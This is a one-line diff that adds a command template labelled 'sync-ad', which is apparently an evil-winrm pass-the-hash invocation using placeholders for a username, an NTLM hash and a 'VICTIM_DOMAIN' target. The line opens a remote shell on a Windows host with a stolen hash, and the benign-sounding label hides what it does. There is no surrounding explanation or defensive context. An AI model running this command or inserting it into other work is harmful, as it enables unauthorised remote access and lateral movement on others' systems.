@@ -1,0 +1,1 @@
+sync-ad evil-winrm -u 'USERNAME' -H 'HASH' -i VICTIM_DOMAIN
